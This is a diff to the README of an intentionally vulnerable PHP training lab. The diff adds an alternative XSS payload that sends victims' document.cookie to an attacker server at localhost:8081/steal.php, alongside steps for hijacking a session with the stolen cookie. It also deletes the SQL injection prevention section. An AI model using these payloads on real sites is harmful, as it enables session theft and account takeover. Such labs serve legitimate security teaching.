@@ -90,6 +90,13 @@ setcookie('user_session', $user_id, time() + 3600, '/', '', false, false);
    fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.cookie))
    </script>
    ```
+   
+   Alternative payload:
+   ```html
+   <script>
+   new Image().src = "http://localhost:8081/steal.php?cookie=" + encodeURIComponent(document.cookie);
+   </script>
+   ```
 
 2. **Use the Stolen Cookie**
    - Copy the user_session value from the attacker logs
@@ -99,7 +106,7 @@ setcookie('user_session', $user_id, time() + 3600, '/', '', false, false);
    ```javascript
    document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/"
    ```
-   - Refresh the page
+   - Navigate to http://localhost:8080
    - You should now be logged in as the victim
 
 3. **Important Notes**
@@ -169,7 +176,9 @@ $content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
 $hashed_password = password_hash($password, PASSWORD_DEFAULT);
 ```
 
-## Common Issues
+## Troubleshooting
+
+### Common Issues
 
 1. **Database Connection Fails**
    - Ensure all containers are running: `docker ps`
@@ -180,11 +189,35 @@ $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    - Check database logs
    - Verify user table creation
    - Check for SQL errors
+   - Make sure you're using the same username/password for login that you used for signup
 
 3. **Cookie Stealing Not Working**
    - Ensure both applications are accessible
    - Check browser console for errors
    - Verify attacker server permissions
+   - Check logs directory permissions
+
+4. **Comments Not Saving**
+   - Verify you're properly logged in
+   - Check for SQL errors in the logs
+   - Make sure your comment doesn't contain unescaped quotes
+
+5. **Session Issues**
+   - Clear browser cookies and try again
+   - Verify session is being set correctly
+   - Check for proper cookie authentication
+
+### Resetting the Application
+
+If you encounter persistent issues, you can reset the application:
+
+```bash
+# Stop containers and remove volumes
+docker-compose down -v
+
+# Rebuild and start
+docker-compose up --build
+```
 
 ## Legal Disclaimer
 
@@ -194,10 +227,6 @@ This project is for educational purposes only. Using these techniques against re
 - Get written permission before testing
 - Follow responsible disclosure
 - Respect privacy and data protection laws
-
-## License
-
-This project is released under the MIT License. Use it responsibly.
 
 ## SQL Injection Vulnerabilities
 
@@ -263,26 +292,6 @@ fetch('http://localhost:8081/steal.php?cookie=' + encodeURIComponent(document.co
 3. Steal cookies from other users
 4. Use stolen cookies to impersonate users
 
-### Prevention
-To prevent SQL injection:
-
-1. Use Prepared Statements:
-```php
-$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
-$stmt->bind_param("ss", $username, $password);
-```
-
-2. Escape Input:
-```php
-$username = $mysqli->real_escape_string($username);
-```
-
-3. Use Parameterized Queries:
-```php
-$stmt = $mysqli->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
-$stmt->bind_param("ss", $username, $password);
-```
-
 ## Development and Updates
 
 ### Updating Code Changes
@@ -331,36 +340,6 @@ When you make changes to the code, you need to rebuild and restart the container
    docker-compose exec db mysql -udbuser -pdbpassword vulnerable_db
    ```
 
-### Common Development Issues
-
-1. **Changes Not Appearing**
-   - Make sure to rebuild: `docker-compose up --build`
-   - Check file permissions
-   - Clear browser cache
-
-2. **Database Reset Needed**
-   ```bash
-   # Complete reset
-   docker-compose down -v
-   docker system prune -a --volumes
-   docker-compose up --build
-   ```
-
-3. **Permission Issues**
-   ```bash
-   # Fix logs directory permissions
-   chmod -R 777 attacker-server/logs
-   ```
-
-4. **Container Access**
-   ```bash
-   # Access vulnerable-app container
-   docker-compose exec vulnerable-app bash
-
-   # Access database
-   docker-compose exec db bash
-   ```
-
 ### Development Tips
 
 1. **View Logs**
@@ -398,8 +377,26 @@ When you make changes to the code, you need to rebuild and restart the container
    ini_set('display_errors', 1);
    ```
 
-Remember to always use `docker-compose down -v` when:
-- Changing database schema
-- Resetting the application state
-- Having persistent issues
-- Testing from scratch 
+## Recent Fixes
+
+The application has been updated with the following improvements:
+
+1. **Database Persistence**: Tables are now only created if they don't exist, ensuring user data persists across sessions.
+
+2. **Cookie Authentication**: Improved cookie handling to properly authenticate users across pages.
+
+3. **Error Handling**: Added better error handling and debugging output to help troubleshoot issues.
+
+4. **SQL Escaping**: Fixed issues with special characters in comments by properly escaping strings.
+
+5. **Session Management**: Fixed session handling to ensure users stay logged in properly.
+
+6. **UI Improvements**: Enhanced the user interface for better usability.
+
+7. **Logging**: Improved logging for both the vulnerable app and attacker server.
+
+These fixes maintain the intentional vulnerabilities for educational purposes while making the application more stable and usable.
+
+## License
+
+This project is released under the MIT License. Use it responsibly. 
